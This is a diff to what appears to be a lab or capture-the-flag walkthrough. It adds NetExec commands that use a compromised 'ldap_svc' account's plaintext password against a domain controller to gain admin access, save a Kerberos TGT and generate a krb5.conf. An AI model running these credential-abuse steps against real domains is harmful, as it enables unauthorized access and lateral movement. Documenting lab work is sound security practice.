@@ -571,5 +571,22 @@ SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.loc
 ```
 Using kerberos auth i see the user is compromised
 
+```python
+nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k --generate-tgt ldap_svc
+SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
+SMB         dc.ext.darkhaven.local 445    DC               [+] TGT saved to: ldap_svc.ccache
+SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=ldap_svc.ccache
 ```
+To make things easier ill generate a TGT for the user 
+
+
+
+```python
+nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k --generate-krb5-file krb5.conf
+SMB         dc.ext.darkhaven.local 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:ext.darkhaven.local) (signing:True) (SMBv1:None)
+SMB         dc.ext.darkhaven.local 445    DC               [+] krb5 conf saved to: krb5.conf
+SMB         dc.ext.darkhaven.local 445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
+SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.local\ldap_svc:6trfgvb**hs#@jskKFHJAh34 (Pwn3d!)
 ```
+
